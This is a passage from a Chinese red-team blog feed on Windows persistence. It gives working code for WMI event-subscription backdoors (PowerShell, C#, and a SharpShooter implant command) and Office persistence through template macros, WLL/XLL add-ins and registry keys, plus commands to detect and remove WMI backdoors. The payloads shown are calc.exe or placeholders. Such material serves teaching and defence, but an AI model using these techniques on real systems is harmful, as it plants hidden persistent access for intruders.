class="line">2、wmic.exe</span><br><span class="line">3、wbemtest.exe</span><br><span class="line">4、WMI Explorer</span><br><span class="line">5、CIM Studio</span><br><span class="line">6、Windows Script Host (WSH) languages</span><br><span class="line">7、C/C++ via IWbem* COM API</span><br><span class="line">8、.NET using System.Management classes</span><br><span class="line">9、winrm.exe</span><br></pre></td></tr></table></figure><h2 id="0x03-WMI事件"><a href="#0x03-WMI事件" class="headerlink" title="0x03 WMI事件"></a>0x03 WMI事件</h2><p>WMI事件分两类，包括<code>本地事件</code>（运行在本地上下文环境当中的单个进程的事件）和<code>永久性WMI事件订阅</code>。</p><p>本地事件有生命周期为进程宿主的周期，而永久性 WMI事件 是存储在WMI库中，以 SYSTEM 权限运行，并且重启后依然存在。</p><h3 id="3-1-前置条件"><a href="#3-1-前置条件" class="headerlink" title="3.1 前置条件"></a>3.1 前置条件</h3><p>为了能够安装一个<code>永久性的 WMI 事件订阅</code>，必须满足两个条件：</p><ul><li>一个 <code>__EventFilter</code> 查询，它创建一个过滤器，为我们的特定事件选择触发器;</li><li><a href="https://docs.microsoft.com/en-gb/windows/desktop/WmiSdk/standard-consumer-classes" target="_blank" rel="noopener">Event Consumer Class</a>，代表一个事件触发时所执行的操作。</li></ul><p>在 <code>Event Consumers</code>（事件处理）中，可用的标准事件处理类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LogFileEventConsumer： 将事件数据写入到指定的日志文件</span><br><span class="line">ActiveScriptEventConsumer： 用来执行VBScript/JScript程序</span><br><span class="line">NTEventLogEventConsumer：创建一个包含事件数据的日志入口点</span><br><span class="line">SMTPEventConsumer：将事件数据用邮件发送</span><br><span class="line">CommandLineEventConsumer：执行一条命令</span><br></pre></td></tr></table></figure></p><p>利用点</p><ul><li><code>ActiveScriptEventConsumer</code>，允许执行任意脚本（支持 <code>JScript</code> 和 <code>VBScript</code> 引擎）</li><li><code>CommandLineEventConsumer</code>，允许执行任意命令</li></ul><h3 id="3-2-测试"><a href="#3-2-测试" class="headerlink" title="3.2 测试"></a>3.2 测试</h3><p>使用以下查询进行测试：</p><p><code>Select * From __InstanceCreationEvent Where TargetInstance Isa &quot;Win32_Process&quot;</code></p><p>为了方便测试，此处使用 <code>Powershell 的 Register-WMIEvent</code> 安装触发器。</p><p><img src="/image/永久性 WMIC 事件订阅 - 权限维持（三）/blog_2019-05-30_11-42-33.png" alt="blog_2019-05-30_11-42-33"></p><p>以上测试不符合实际需求。</p><h3 id="3-3-Powershell-实例（命令执行）"><a href="#3-3-Powershell-实例（命令执行）" class="headerlink" title="3.3 Powershell 实例（命令执行）"></a>3.3 Powershell 实例（命令执行）</h3><p>下面的 <code>PowerShell</code> 代码来自一个叫 <code>SEADADDY</code> 的恶意软件的修改版，用来通过<code>WMI做持久化</code>的</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$EventFilterName</span> = <span class="string">'BotFilter11'</span></span><br><span class="line"><span class="variable">$EventConsumerName</span> = <span class="string">'BotConsumer22'</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$EventFilterArgs</span> = @&#123;</span><br><span class="line">EventNamespace = <span class="string">'root\cimv2'</span></span><br><span class="line">Name = <span class="variable">$EventFilterName</span></span><br><span class="line">Query = <span class="string">'Select * From __InstanceCreationEvent Where TargetInstance Isa "Win32_Process"'</span></span><br><span class="line">QueryLanguage=<span class="string">"WQL"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$WMIEventFilter</span> = <span class="built_in">Set-WmiInstance</span> -NameSpace <span class="string">'root\subscription'</span> -Class __EventFilter -Arguments <span class="variable">$EventFilterArgs</span> -ErrorAction Stop</span><br><span class="line"></span><br><span class="line"><span class="variable">$CommandLineumerArgs</span> =@&#123;</span><br><span class="line">        Name=<span class="variable">$EventConsumerName</span></span><br><span class="line">CommandLineTemplate=<span class="string">'C:\Windows\System32\calc.exe'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$WMIEventConsumer</span> = <span class="built_in">Set-WmiInstance</span> -Namespace <span class="string">'root\subscription'</span> -Class CommandLineEventConsumer -Arguments <span class="variable">$CommandLineumerArgs</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$WMIEventFilterToConsumerArgs</span> = @&#123;</span><br><span class="line"><span class="keyword">Filter</span>=<span class="variable">$WMIEventFilter</span></span><br><span class="line">Consumer=<span class="variable">$WMIEventConsumer</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-WmiInstance</span> -Namespace <span class="string">'root\subscription'</span> -Class __FilterToConsumerBinding -Arguments <span class="variable">$WMIEventFilterToConsumerArgs</span></span><br></pre></td></tr></table></figure><p>但是这里实测失败，就算使用<code>C#</code>去添加 <code>CommandLineEventConsumer</code> 也是失败的，但是 <code>LogFileEventConsumer</code> 可成功。</p><h3 id="3-4-C-实例（代码执行）"><a href="#3-4-C-实例（代码执行）" class="headerlink" title="3.4 C# 实例（代码执行）"></a>3.4 C# 实例（代码执行）</h3><p>本示例执行的是 <code>VBScript</code></p><p>使用<code>SharpShooter</code>生成 <code>VBSceipt</code> 类型的 <code>payload</code>。<em>友情提示：一定要生成 64位的 payload。</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; python SharpShooter.py --stageless --dotnetver 2 --payload vbs --output implantvbs --rawscfile payload64.bin</span><br><span class="line"></span><br><span class="line">       _____ __                    _____ __                __           </span><br><span class="line">      / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____</span><br><span class="line">      \__ \/ __ \/ __ `/ ___/ __ \__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/</span><br><span class="line">     ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /    </span><br><span class="line">    /____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/     </span><br><span class="line">                         /_/                                            </span><br><span class="line"></span><br><span class="line">     Dominic Chell, @domchell, MDSec ActiveBreach, v2.0</span><br><span class="line">    </span><br><span class="line">[*] Written delivery payload to output/implantvbs.vbs</span><br><span class="line">运行vbs，成功上线，再进行 base64 编码</span><br><span class="line">&gt; base64 -i output/implantvbs.vbs &gt;&gt;implantvbs-base64.txt</span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">// WMI Event Subscription Peristence Demo</span><br><span class="line">// Author: @domchell</span><br><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Management;</span><br><span class="line"></span><br><span class="line">namespace WMIPersistence</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            PersistWMI();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        static void PersistWMI()</span><br><span class="line">        &#123;</span><br><span class="line">            ManagementObject myEventFilter = null;</span><br><span class="line">            ManagementObject myEventConsumer = null;</span><br><span class="line">            ManagementObject myBinder = null;</span><br><span class="line"></span><br><span class="line">            string vbscript64 = &quot;&lt;INSIDE base64 encoded VBS here&gt;&quot;;</span><br><span class="line">            string vbscript = Encoding.UTF8.GetString(Convert.FromBase64String(vbscript64));</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                ManagementScope scope = new ManagementScope(@&quot;\\.\root\subscription&quot;);</span><br><span class="line"></span><br><span class="line">                ManagementClass wmiEventFilter = new ManagementClass(scope, new</span><br><span class="line">                ManagementPath(&quot;__EventFilter&quot;), null);</span><br><span class="line">                String strQuery = @&quot;SELECT * FROM __InstanceCreationEvent WITHIN 5 &quot; +            </span><br><span class="line">        &quot;WHERE TargetInstance ISA \&quot;Win32_Process\&quot; &quot; +           </span><br><span class="line">        &quot;AND TargetInstance.Name = \&quot;notepad.exe\&quot;&quot;;</span><br><span class="line"></span><br><span class="line">                WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);</span><br><span class="line">                myEventFilter = wmiEventFilter.CreateInstance();</span><br><span class="line">                myEventFilter[&quot;Name&quot;] = &quot;demoEventFilter&quot;;</span><br><span class="line">                myEventFilter[&quot;Query&quot;] = myEventQuery.QueryString;</span><br><span class="line">                myEventFilter[&quot;QueryLanguage&quot;] = myEventQuery.QueryLanguage;</span><br><span class="line">                myEventFilter[&quot;EventNameSpace&quot;] = @&quot;\root\cimv2&quot;;</span><br><span class="line">                myEventFilter.Put();</span><br><span class="line">                Console.WriteLine(&quot;[*] Event filter created.&quot;);</span><br><span class="line"></span><br><span class="line">                myEventConsumer =</span><br><span class="line">                new ManagementClass(scope, new ManagementPath(&quot;ActiveScriptEventConsumer&quot;),</span><br><span class="line">                null).CreateInstance();</span><br><span class="line">                myEventConsumer[&quot;Name&quot;] = &quot;BadActiveScriptEventConsumer&quot;;</span><br><span class="line">                myEventConsumer[&quot;ScriptingEngine&quot;] = &quot;VBScript&quot;;</span><br><span class="line">                myEventConsumer[&quot;ScriptText&quot;] = vbscript;</span><br><span class="line">                myEventConsumer.Put();</span><br><span class="line"></span><br><span class="line">                Console.WriteLine(&quot;[*] Event consumer created.&quot;);</span><br><span class="line"></span><br><span class="line">                myBinder =</span><br><span class="line">                new ManagementClass(scope, new ManagementPath(&quot;__FilterToConsumerBinding&quot;),</span><br><span class="line">                null).CreateInstance();</span><br><span class="line">                myBinder[&quot;Filter&quot;] = myEventFilter.Path.RelativePath;</span><br><span class="line">                myBinder[&quot;Consumer&quot;] = myEventConsumer.Path.RelativePath;</span><br><span class="line">                myBinder.Put();</span><br><span class="line"></span><br><span class="line">                Console.WriteLine(&quot;[*] Subscription created&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(e);</span><br><span class="line">            &#125; // END CATCH</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125; // END FUNC</span><br><span class="line">    &#125; // END CLASS</span><br><span class="line">&#125; // END NAMESPACE</span><br></pre></td></tr></table></figure><p>管理员权限运行生成的exe，<strong>演示 GIF</strong></p><p><img src="/image/永久性 WMIC 事件订阅 - 权限维持（三）/blog_2019-05-29_11-42-33.gif" alt="blog_2019-05-29_11-42-33"></p><h2 id="0x04-WMI后门检测及清除"><a href="#0x04-WMI后门检测及清除" class="headerlink" title="0x04 WMI后门检测及清除"></a>0x04 WMI后门检测及清除</h2><h3 id="4-1-Sysmon日志"><a href="#4-1-Sysmon日志" class="headerlink" title="4.1 Sysmon日志"></a>4.1 Sysmon日志</h3><p>略….</p><h3 id="4-2-查看当前WMI-Event"><a href="#4-2-查看当前WMI-Event" class="headerlink" title="4.2 查看当前WMI Event"></a>4.2 查看当前WMI Event</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#List Event Filters</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventFilter</span><br><span class="line"></span><br><span class="line">#List Event Consumers</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventConsumer</span><br><span class="line"></span><br><span class="line">#List Event Bindings</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding</span><br></pre></td></tr></table></figure><h3 id="4-3-清除后门"><a href="#4-3-清除后门" class="headerlink" title="4.3 清除后门"></a>4.3 清除后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Filter</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter &quot;Name=&apos;BotFilter82&apos;&quot; | Remove-WmiObject -Verbose</span><br><span class="line"></span><br><span class="line">#Consumer</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter &quot;Name=&apos;BotConsumer23&apos;&quot; | Remove-WmiObject -Verbose</span><br><span class="line"></span><br><span class="line">#Binding</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter &quot;__Path LIKE &apos;%BotFilter82%&apos;&quot; | Remove-WmiObject -Verbose</span><br></pre></td></tr></table></figure><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/" target="_blank" rel="noopener">Persistence: “the continued or prolonged existence of something”: Part 3 – WMI Event Subscription</a><br><a href="https://wooyun.x10sec.org/static/drops/tips-8189.html" target="_blank" rel="noopener">WMI Attacks</a><br><a href="https://4hou.win/wordpress/?p=17080" target="_blank" rel="noopener">利用WMI构建无文件后门（基础篇）</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是针对&lt;a href=&quot;https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Windows常见持久控制&lt;/a&gt;的第三次说明。&lt;/p&gt;
&lt;p&gt;与之前的文章不同，这个操作需要管理员权限。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="权限维持" scheme="https://rcoil.me/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>Microsoft Office - 权限维持（一）</title>
    <link href="https://rcoil.me/2019/05/Microsoft%20Office%20-%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://rcoil.me/2019/05/Microsoft Office - 权限维持（一）/</id>
    <published>2019-05-29T10:52:59.000Z</published>
    <updated>2019-05-31T08:16:19.153Z</updated>
    
    <content type="html"><![CDATA[<p>本文是针对<a href="https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png" target="_blank" rel="noopener">Windows常见持久控制</a>的第一次说明。<br><a id="more"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间有过个需求，判断 <code>Office</code>是否开启宏，索性将 <a href="https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png" target="_blank" rel="noopener">Windows常见持久控制</a> 中有关 <code>Office</code> 的记录也在后文写一下。</p><ul><li>判断是否安装了 <code>Microsoft Office</code></li><li>判断是否开启了 <code>宏</code></li><li>相关利用</li></ul><h2 id="0x01-环境说明"><a href="#0x01-环境说明" class="headerlink" title="0x01 环境说明"></a>0x01 环境说明</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows 7 Ultimate x64</span><br><span class="line">- Office 2007（实际环境）</span><br><span class="line">- Office 2010（测试环境）</span><br><span class="line">- Office 2013（测试环境）</span><br><span class="line">- Office 2016（测试环境）</span><br></pre></td></tr></table></figure><h2 id="0x02-相关判断"><a href="#0x02-相关判断" class="headerlink" title="0x02 相关判断"></a>0x02 相关判断</h2><ul><li><p><code>VBAWarnings</code> 键值数值数据说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1:启用所有宏</span><br><span class="line">2:禁用所有宏并发出通知</span><br><span class="line">3:禁用无数字部署的所有宏</span><br><span class="line">4:禁用所有宏并且不通知</span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">// 通过注册表检测 Office 是否开启宏</span><br><span class="line">        private static void OfficeVBAWarnings(string OfficeVersion)</span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;string&gt; OfficeFeatures = new List&lt;string&gt;()</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;Excel&quot;, &quot;Word&quot;, &quot;PowerPoint&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            foreach (string Features in OfficeFeatures)</span><br><span class="line">            &#123;</span><br><span class="line">                string basekey = @&quot;SOFTWARE\Microsoft\Office\&quot; + OfficeVersion + @&quot;\&quot; + Features + @&quot;\Security&quot;;</span><br><span class="line">                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(basekey);</span><br><span class="line">                if (registryKey != null)</span><br><span class="line">                &#123;</span><br><span class="line">                    string[] ValueNames = registryKey.GetValueNames();</span><br><span class="line">                    if (registryKey.ValueCount == 0)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine(&quot;  [&gt;] &#123;0&#125; VBAWarnings: 2&quot;, Features);</span><br><span class="line">                    &#125;</span><br><span class="line">                    else</span><br><span class="line">                    &#123;</span><br><span class="line">                        foreach (string KeyName in ValueNames)</span><br><span class="line">                        &#123;</span><br><span class="line">                            object VBAWarnings = registryKey.GetValue(&quot;VBAWarnings&quot;);</span><br><span class="line">                            Console.WriteLine(&quot;  [&gt;] &#123;0&#125; VBAWarnings: &#123;1&#125;&quot;, Features, VBAWarnings);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 通过注册表检测 Office 版本</span><br><span class="line">        private static void OfficeIsInstall(string OfficeVersion)</span><br><span class="line">        &#123;</span><br><span class="line">            string basekey = @&quot;SOFTWARE\Microsoft\Office\&quot; + OfficeVersion + @&quot;\Common\InstallRoot&quot;;</span><br><span class="line">            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(basekey);</span><br><span class="line">            if (registryKey != null)</span><br><span class="line">            &#123;</span><br><span class="line">                if (registryKey.GetValue(&quot;Path&quot;) != null)</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(&quot;  [&gt;] Microsoft Office Version: &#123;0&#125;&quot;, OfficeVersion);</span><br><span class="line">                    OfficeVBAWarnings(OfficeVersion);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;string&gt; OfficeVersions = new List&lt;string&gt;()</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;8.0&quot;, &quot;9.0&quot;, &quot;10.0&quot;, &quot;11.0&quot;, &quot;12.0&quot;, &quot;14.0&quot;, &quot;15.0&quot;, &quot;16.0&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            foreach (string OfficeVersion in OfficeVersions)</span><br><span class="line">            &#123;</span><br><span class="line">                OfficeIsInstall(OfficeVersion);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x03-Office-模板宏"><a href="#0x03-Office-模板宏" class="headerlink" title="0x03 Office 模板宏"></a>0x03 Office 模板宏</h2><p>每次 <code>Office</code> 程序启动时都会加载使用 <code>Office</code> 程序中的基本模板。</p><p><em>相关位置</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Word Normal.dotm位置：</span><br><span class="line">C:\Users(username)\AppData\Roaming\Microsoft\Templates\Normal.dotm</span><br><span class="line"></span><br><span class="line">Excel Personal.xlsb位置：C:\Users(username)\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB</span><br></pre></td></tr></table></figure><p><em>这一部分在倾旋的博客有提到</em></p><p>新建宏名字 –&gt; <code>word</code> 为<em>AutoOpen</em>， <code>Excel</code> 为<em>Auto_Open</em></p><p>使用 <code>GIF</code> 进行演示（Excel 同理）</p><p><img src="/image/Microsoft Office - 持久控制（一）/Blog_2019-05-27_22-32-49.gif" alt="Blog_2019-05-27_22-32-49.png"></p><p>本地使用相对应的 <code>Office</code> 版本生成的全局宏，替换目标机器对应的 <code>Office</code> 版本的全局宏，可行。</p><h2 id="0x04-Office-加载项"><a href="#0x04-Office-加载项" class="headerlink" title="0x04 Office  加载项"></a>0x04 Office  加载项</h2><p><code>Office</code> 中支持不同类型的加载项，从本质上来讲，<code>Office</code> 套装有很多受信任的位置，当放置库文件时，在打开 <code>Office</code> 程序时，会自动加载库文件。在 <code>Office</code> 的信任中心选择禁用加载项，实际上不会禁用WLL，也不会阻止VBA代码执行。</p><h3 id="1）Word-的-WLL-加载项"><a href="#1）Word-的-WLL-加载项" class="headerlink" title="1）Word 的 WLL 加载项"></a>1）Word 的 WLL 加载项</h3><p><code>Word</code> 的三个默认加载项位置如下所示：</p><p><img src="/image/Microsoft Office - 持久控制（一）/Blog_2019-05-27_22-32-49.png" alt="Blog_2019-05-27_22-32-49.png"></p><p>对用户位置中的 <code>Startup</code> 进一步调查发现，它是 Word 默认存放<code>全局模板</code>和<code>加载项</code>的文件夹，当启动Word时，程序会自动加载 <code>Startup</code> 文件夹中所有<code>*.dot、*.dotx或*.dotm</code>格式的Word文件，也可以托管拓展名为 <code>* .wll</code> 的文件。而<code>* .wll</code> 文件本质上是一个带有额外<code>特定于Office的扩展的DLL</code>。这意味着<code>* .wll</code> 文件起码可以实现基本的 <code>DLL 功能</code>，我们只需要将<code>*.dll</code> 重命名为 <code>*.wll</code>，放入此文件夹中，可获取当前<code>启动 word 的用户</code>的执行权限。</p><p><em>示例</em>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int Run()</span><br><span class="line">&#123;</span><br><span class="line">system(&quot;calc&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">DWORD ul_reason_for_call,</span><br><span class="line">LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">switch (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line">case DLL_PROCESS_ATTACH:</span><br><span class="line">Run();</span><br><span class="line">case DLL_THREAD_ATTACH:</span><br><span class="line">case DLL_THREAD_DETACH:</span><br><span class="line">case DLL_PROCESS_DETACH:</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这步骤出现了无法加载 <code>wll</code> 问题，所以我直接提问 <a href="https://www.twitter.com/domchell" target="_blank" rel="noopener">Dominic Chell.</a>，他给我的回答是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我在测试的时候也遇到了这样的问题，我认为它是使用了 UI 来弹出东西的，所以建议使用一个简单的 MessageBox 进行测试。并且确保是从 attach 当中调用 Run()。</span><br><span class="line"></span><br><span class="line">在使用 MessageBox 时，确保没有使用任何有关系统的东西（避免缺失 DLL），并尝试所有的switch cases</span><br></pre></td></tr></table></figure><p>exp 思路就不说了。</p><h3 id="2）Excel-的-XLL-加载项"><a href="#2）Excel-的-XLL-加载项" class="headerlink" title="2）Excel 的 XLL 加载项"></a>2）Excel 的 XLL 加载项</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\Excel\Options注册表项中添加一个键值</span><br><span class="line">OPEN /R DemoAddin.xll</span><br></pre></td></tr></table></figure><p><code>Excel</code> 启动时，会自动检索 <code>C:\Users(username)\AppData\Roaming\Microsoft\AddIns</code>目录，所以不需要写入绝对路径，默认自动加载。</p><h3 id="3）PowerPoint-的-VBA-加载项"><a href="#3）PowerPoint-的-VBA-加载项" class="headerlink" title="3）PowerPoint 的 VBA 加载项"></a>3）PowerPoint 的 VBA 加载项</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\PowerPoint\AddIns\&lt;AddInName&gt;</span><br></pre></td></tr></table></figure><p>文件格式为 <code>*.ppam</code> 或 <code>*.ppa</code>，也是与Excel 一样，放入<code>AddIns</code> 目录中。设置 <code>Autoload</code> 键值为 <strong>1</strong> ，更改PowerPoint 启动时自动加载加载项。</p><p><img src="/image/Microsoft Office - 持久控制（一）/Blog_2019-05-28_12-32-49.png" alt="Blog_2019-05-28_12-32-49"></p><p>关于<code>wll(DLL)</code> 、 <code>xll(VBA)</code> 和 <code>ppam</code> 